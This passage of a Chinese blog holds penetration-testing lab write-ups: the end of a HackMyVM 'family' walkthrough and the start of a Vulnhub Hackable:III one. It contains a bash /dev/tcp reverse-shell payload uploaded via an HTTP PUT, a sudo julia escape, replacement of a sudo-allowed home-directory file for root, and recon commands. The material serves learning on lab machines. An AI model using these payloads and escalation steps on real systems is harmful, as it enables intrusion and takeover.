class="number">11</span><span class="symbol">:</span><span class="number">42</span><span class="symbol">:</span><span class="number">40</span> (<span class="number">1.63</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;socat&#x27;</span> saved [<span class="number">375176</span>/<span class="number">375176</span>]</span><br><span class="line"></span><br><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x socat</span><br><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>./socat <span class="variable constant_">TCP</span>-<span class="variable constant_">LISTEN</span><span class="symbol">:</span><span class="number">8080</span>,fork <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>  </span><br><span class="line">^<span class="title class_">Cmum</span><span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>./socat <span class="variable constant_">TCP</span>-<span class="variable constant_">LISTEN</span><span class="symbol">:</span><span class="number">8080</span>,fork <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>  ^C</span><br><span class="line">mum<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>./socat <span class="variable constant_">TCP</span>-<span class="variable constant_">LISTEN</span><span class="symbol">:</span><span class="number">8080</span>,fork <span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">8000</span>  &amp;</span><br><span class="line">[<span class="number">1</span>] <span class="number">34365</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>把127.0.0.1:8000 转发到8080端口 用<code>&amp;</code>在后台进行<br>现在去访问8080端口就有东西了，这里是显示返回为空</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="meta"># curl 192.168.58.62:8080</span></span><br><span class="line">curl: (<span class="number">52</span>) Empty reply <span class="keyword">from</span> <span class="keyword">server</span></span><br></pre></td></tr></table></figure></div>
<p>这里有一个比较难想的点就是怎么把文件写入到这个survey目录下面，因为这里的project会执行所有survey下面的文件<br>这里是用了一个nikto扫描了一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nikto -h <span class="number">192.168</span><span class="number">.58</span><span class="number">.39</span>:<span class="number">8080</span></span><br><span class="line">- Nikto v2<span class="number">.5</span><span class="number">.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span><span class="number">.58</span><span class="number">.39</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span><span class="number">.58</span><span class="number">.39</span></span><br><span class="line">+ Target Port:        <span class="number">8080</span></span><br><span class="line">+ <span class="keyword">Start</span> <span class="type">Time</span>:         <span class="number">2025</span><span class="number">-03</span><span class="number">-07</span> <span class="number">19</span>:<span class="number">20</span>:<span class="number">02</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: SimpleHTTP/<span class="number">0.6</span> Python/<span class="number">2.7</span><span class="number">.18</span></span><br><span class="line">+ /: The anti-clickjacking X-Frame-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-<span class="keyword">Options</span></span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span>. This could allow the <span class="keyword">user</span> agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-<span class="keyword">header</span>/</span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="built_in">found</span> (use <span class="string">&#x27;-C all&#x27;</span> <span class="keyword">to</span> force <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Python/<span class="number">2.7</span><span class="number">.18</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> at least <span class="number">3.9</span><span class="number">.6</span>).</span><br><span class="line">+ SimpleHTTP/<span class="number">0.6</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> at least <span class="number">1.2</span>).</span><br><span class="line"></span><br><span class="line">mum@<span class="keyword">family</span>:/home/dad/survey$ ls</span><br><span class="line"><span class="keyword">index</span>.html  nikto-test-LsluKoIs.html  <span class="keyword">server</span>.py</span><br></pre></td></tr></table></figure></div>
<p>结果发现在survey下面多了一个 nikto-test-LsluKoIs.html，因为在nikto扫描的时候会尝试上传文件，说明这个页面是可以上传文件<br>所以用PUT请求方式上传一个反弹shell的sh文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -X PUT 192.168.58.39:8080/reverse -d <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.58.11/1234 0&gt;&amp;1&quot;</span>                                               </span><br><span class="line">curl: (52) Empty reply <span class="keyword">from</span><span class="built_in"> server</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"> mum@family:/home/dad$ ./project </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234                </span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(5833): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">dad@family:~$ id</span><br><span class="line"><span class="attribute">uid</span>=1000(dad) <span class="attribute">gid</span>=1000(dad) <span class="attribute">groups</span>=1000(dad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)</span><br><span class="line">dad@family:~$ id</span><br><span class="line"><span class="attribute">uid</span>=1000(dad) <span class="attribute">gid</span>=1000(dad) <span class="attribute">groups</span>=1000(dad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)</span><br><span class="line">dad@family:~$ </span><br></pre></td></tr></table></figure></div>

<h2 id="dad"><a href="#dad" class="headerlink" title="dad"></a>dad</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">dad<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> dad on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> dad may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (baby) <span class="symbol">NOPASSWD:</span> /usr/bin/julia</span><br></pre></td></tr></table></figure></div>
<p>在gtfobins里面找到提权方式  <code>sudo julia -e &#39;run(</code>&#x2F;bin&#x2F;sh<code>)&#39; </code><br>得到baby的shell</p>
<h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">b👶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /home/baby/chocapic</span><br></pre></td></tr></table></figure></div>
<p>baby在自己目录下面有一个sudo权限的文件.因为这个是在自己家目录里面的文件，所以可以直接删除再创建</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">b👶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>rm chocapic</span><br><span class="line"><span class="symbol">rm:</span> remove write-<span class="keyword">protected</span> regular file <span class="string">&#x27;chocapic&#x27;</span>? y</span><br><span class="line">b👶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">user.txt</span><br><span class="line">b👶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;/bin/bash -p&quot;</span> &gt; chocapic</span><br><span class="line">b👶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x chocapic </span><br><span class="line">b👶by<span class="variable">@family</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /home/baby/chocapic</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">warning:</span> <span class="symbol">setlocale:</span> <span class="variable constant_">LC_ALL</span>: cannot change locale (en_US.<span class="variable constant_">UTF</span>-<span class="number">8</span>)</span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:/home/baby</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>拿到了root</p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>这题拿到了root权限还不行，不能直接看flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:/home/baby</span><span class="comment"># cd </span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># cat root.txt </span></span><br><span class="line"><span class="title class_">Salted__</span><span class="string">&quot;?1լ???Ȉ?m?:Pi?|q?8FH?yNU:k?.ᛥ?24?&#125;??;E?$/7root@family:~# </span></span><br><span class="line"><span class="string">root@family:~# file root.txt </span></span><br><span class="line"><span class="string">root.txt: openssl enc&#x27;d data with salted password</span></span><br></pre></td></tr></table></figure></div>
<p>这是一个openssl加密过的密码<br>这里说明还有别的信息，我新学了原来还可以看磁盘空间，这题就是有别的磁盘 用fdisk -l</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">root@family:~<span class="comment"># fdisk -l</span></span><br><span class="line">Disk /dev/sda: 15.26 GiB,<span class="number"> 16385299968 </span>bytes,<span class="number"> 32002539 </span>sectors</span><br><span class="line">Disk model: VBOX HARDDISK   </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0xb6ff27bb</span><br><span class="line"></span><br><span class="line">Device     Boot    Start      End  Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       <span class="number"> 2048 </span>27897855<span class="number"> 27895808 </span>13.3G<span class="number"> 83 </span>Linux</span><br><span class="line">/dev/sda2      <span class="number"> 27899902 </span>29898751 <span class="number"> 1998850 </span> 976M <span class="number"> 5 </span>Extended</span><br><span class="line">/dev/sda3      <span class="number"> 29898752 </span>32002047 <span class="number"> 2103296 </span>   1G<span class="number"> 83 </span>Linux</span><br><span class="line">/dev/sda5      <span class="number"> 27899904 </span>29898751 <span class="number"> 1998848 </span> 976M<span class="number"> 82 </span>Linux swap / Solaris</span><br></pre></td></tr></table></figure></div>
<p>发现还有一个&#x2F;dev&#x2F;sda3 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># mount /dev/sda3 /mnt</span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># cd /mnt</span></span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:/mnt</span><span class="comment"># ls</span></span><br><span class="line">password</span><br><span class="line">root<span class="variable">@family</span><span class="symbol">:/mnt</span><span class="comment"># cat password </span></span><br><span class="line"><span class="title class_">QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma</span></span><br></pre></td></tr></table></figure></div>
<p>把sda3挂载到&#x2F;mnt之后，找到一个密码，但是这个密码不是root的密码 这个应该就是openssl的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">root<span class="keyword">@family</span>:~# openssl enc -d -aes-<span class="number">256</span>-cbc -in root.txt -k QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma</span><br><span class="line">*** WARNING : deprecated key derivation used.</span><br><span class="line">Using -iter <span class="keyword">or</span> -pbkdf2 would be better.</span><br><span class="line">bad decrypt</span><br><span class="line"><span class="number">139669560771904</span>:<span class="attribute">error</span>:<span class="number">06065064</span>:digital envelope <span class="attribute">routines</span>:EVP_DecryptFinal_<span class="attribute">ex</span>:bad <span class="attribute">decrypt</span>:../crypto/evp/evp_enc.<span class="attribute">c</span>:<span class="number">610</span>:</span><br></pre></td></tr></table></figure></div>
<p>直接尝试之后说要用-pbkdf2</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># openssl enc -d -aes-256-cbc -in root.txt -k QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma -pbkdf2</span></span><br><span class="line">G??Ʋ.?</span><br><span class="line">      ??`?͙???<span class="string">&quot;?&quot;</span></span><br><span class="line">bad decrypt</span><br><span class="line"><span class="number">139681936713024</span><span class="symbol">:error</span><span class="symbol">:</span><span class="number">06065064</span><span class="symbol">:digital</span> envelope <span class="symbol">routines:</span><span class="symbol">EVP_DecryptFinal_ex:</span>bad <span class="symbol">decrypt:</span>../crypto/evp/<span class="symbol">evp_enc.c:</span><span class="number">610</span>:</span><br><span class="line">-c???=root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>还是不行，最后切换密钥分组长度从256修改成128可以了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@family</span><span class="symbol">:~</span><span class="comment"># openssl enc -d -aes-128-cbc -in root.txt -k QHSvtnwvnUgKRGDQfG6rC58bAU4woNIW0Z7eL6ma -pbkdf2</span></span><br><span class="line"><span class="number">8</span>d8ff4976efccbfc8ff7d7554b9239e5</span><br></pre></td></tr></table></figure></div>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>这个靶机让我学到了一个新服务ipp 而且这个服务有漏洞</li>
<li>学习到用wfuzz的扫描方式</li>
<li>这个用户什么东西有没有的时候去其他用户里面看看有什么可以执行的文件</li>
<li>自己家目录下面的文件要是有sudo权限就直接删除再创一个提权</li>
<li>学习到df -h 和 fdisk -l 命令，两个关于磁盘的命令， 可能有信息在不同的磁盘</li>
<li>最后了解了openssl的加解密方式</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Hackable:III</title>
    <url>/posts/64270.html</url>
    <content><![CDATA[<p>Vulnhub-Hackable:III靶机复盘</p>
<span id="more"></span>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.164    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">11</span> <span class="number">17</span>:<span class="number">01</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.164</span> (<span class="number">192.168</span>.<span class="number">179.164</span>)</span><br><span class="line">Host is up (<span class="number">0.0030</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> filtered ssh</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open     http    Apache httpd <span class="number">2.4</span>.<span class="number">46</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Kryptos <span class="operator">-</span> LAN Home</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.46</span> (Ubuntu)</span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/config</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">2</span>A:A3:<span class="number">5</span>A:<span class="number">42</span>:<span class="number">17</span>:<span class="number">24</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.98</span> ms <span class="number">192.168</span>.<span class="number">179.164</span> (<span class="number">192.168</span>.<span class="number">179.164</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.08</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>没有什么多多余的信息了，只开放80和22,但是22端口是filtered，大概率要knock  去web看看</p>
<h1 id="web-探测"><a href="#web-探测" class="headerlink" title="web 探测"></a>web 探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.164                      </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;pt-br&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://fonts.googleapis.com/css?family=RocknRoll+One&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/file.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kryptos - LAN Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;menu-open&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;imagens/logo_menu.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">height</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;overlay&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;menu-close&quot;</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;login_page/login.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>出现了一个jubiscleudo的用户名，然后说确实要用knock来打开端口，以及有一个.jpg他需要批准<br>访问一下robots.txt发现有东西！</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.164/robots.txt</span><br><span class="line">User-Agente: *</span><br><span class="line">Disallow: /config</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.164/config    </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The document has moved <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.179.164/config/&quot;</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.46 (Ubuntu) Server at 192.168.179.164 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67ab14c4d0e0a243d4fe55ca.png"><br>web中访问有一个base64加密过的文本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;MTAwMDA=&quot;</span> | <span class="built_in">base64</span> -d                                                </span><br><span class="line">10000 </span><br></pre></td></tr></table></figure></div>
<p>只给了一个端口，先扫一下目录吧</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># gobuster dir -u 192.168.179.164 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x html,php,jpg,wbpg      </span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer 